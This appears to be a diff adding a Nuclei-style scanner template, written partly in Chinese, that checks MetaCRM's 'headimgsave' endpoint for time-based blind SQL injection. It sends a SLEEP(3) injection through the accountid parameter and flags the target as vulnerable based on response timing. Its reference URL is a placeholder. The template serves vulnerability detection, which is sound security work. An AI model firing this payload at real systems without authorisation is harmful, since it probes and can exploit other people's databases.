@@ -1,0 +1,32 @@
+id: MetaCRM-headimgsave-sqli
+
+info:
+  name: 美特CRM headimgsave SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    美特CRM系统headimgsave接口存在基于时间盲注的SQL注入漏洞，攻击者可通过accountid参数执行任意SQL命令。
+    [漏洞发现时间：2025年7月]
+  reference:
+    - https://example.com/metcrm-sqli (替换为实际参考链接)
+  tags: 美特软件-MetaCRM
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/headimgsave?accountid=1'+AND+(SELECT+5+FROM+(SELECT+SLEEP(3))qaz)--+"
+    headers:
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.1188.94 Safari/537.36
+      Connection: close
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=3 && duration<8"
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'message'
